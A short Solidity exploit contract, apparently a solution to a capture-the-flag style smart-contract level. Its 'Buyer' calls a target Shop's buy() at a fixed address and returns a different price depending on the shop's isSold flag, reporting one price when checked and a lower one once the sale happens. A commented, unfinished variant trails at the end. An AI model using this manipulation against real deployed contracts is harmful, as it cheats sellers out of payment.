// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Shop {
    function buy() public {}
    bool public isSold;
}

contract Buyer {

    Shop originalContract = Shop(0x45cde700074317536E9C9830417384335f7F4C11);

    function attack() public {
        originalContract.buy();
    }

    function price() public view returns(uint){
        if (originalContract.isSold() == true){
            return 99;
        }
        else return 101;
    }
}

// function price() public view override returns(uint) {
//        return originalContract.isSold() ? 0 : 100;